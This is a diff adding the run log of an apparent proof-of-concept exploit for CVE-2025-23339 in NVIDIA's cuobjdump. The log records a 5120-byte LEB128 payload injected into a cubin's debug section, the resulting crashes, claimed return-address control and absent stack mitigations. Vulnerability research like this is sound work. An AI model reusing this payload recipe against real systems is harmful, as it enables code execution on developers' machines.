@@ -1,0 +1,39 @@
+===========================================================
+DISCLAIMER: This script is a Proof-of-Concept for CUDA
+vulnerability CVE-2025-23339. It is intended ONLY for authorized
+security research on systems you own or have permission to test.
+===========================================================
+Output directory: <redacted-project-root>\data\outputs\CVE-2025-23339
+GPU: NVIDIA GeForce GTX 1660, 7.5 | driver: 13.4 | toolkit: 11.2
+[CUDA_STEP:S01] environment fingerprint — START
+cuobjdump: NVIDIA (R) fat binary listing tool
+Copyright (c) 2005-2020 NVIDIA Corporation
+Built on Mon_Nov_30_19:15:10_Pacific_Standard_Time_2020
+Cuda compilation tools, release 11.2, V11.2.67
+Build cuda_11.2.r11.2/compiler.29373293_0
+cuobjdump 11.2.0 is in the vulnerable range
+[CUDA_STEP:S01] environment fingerprint — OK
+[CUDA_STEP:S02] generate base cubin with DWARF — START
+[CUDA_STEP:S02] generate base cubin with DWARF — OK
+[CUDA_STEP:S03] locate ELF section headers and .debug_abbrev — START
+[CUDA_STEP:S03] locate ELF section headers and .debug_abbrev — OK
+[CUDA_STEP:S04] build long non-zero LEB128 payload — START
+payload bytes = 5120 | unit = c1 82 85 8a 04
+[CUDA_STEP:S04] build long non-zero LEB128 payload — OK
+[CUDA_STEP:S05] inject payload and write malicious cubin — START
+wrote <redacted-project-root>\data\outputs\CVE-2025-23339\malicious_41414141.cubin
+wrote <redacted-project-root>\data\outputs\CVE-2025-23339\malicious_42424242.cubin
+[CUDA_STEP:S05] inject payload and write malicious cubin — OK
+[CUDA_STEP:S06] trigger cuobjdump --dump-elf — START
+malicious_41414141.cubin -> exit=3221225477 (crash)
+malicious_42424242.cubin -> exit=3221225477 (crash)
+[CUDA_STEP:S06] trigger cuobjdump --dump-elf — OK
+[CUDA_STEP:S07] confirm return-address control — START
+2 variant(s) crashed; confirm RIP under a debugger (expected 0x41414141)
+[CUDA_STEP:S07] confirm return-address control — OK
+[CUDA_STEP:S08] verify control varies with input — START
+exercised targets 0x41414141 and 0x42424242
+[CUDA_STEP:S08] verify control varies with input — OK
+[CUDA_STEP:S09] assess platform mitigations — START
+__stack_chk_fail=False, __security_cookie=False, __guard=False
+[CUDA_STEP:S09] assess platform mitigations — OK
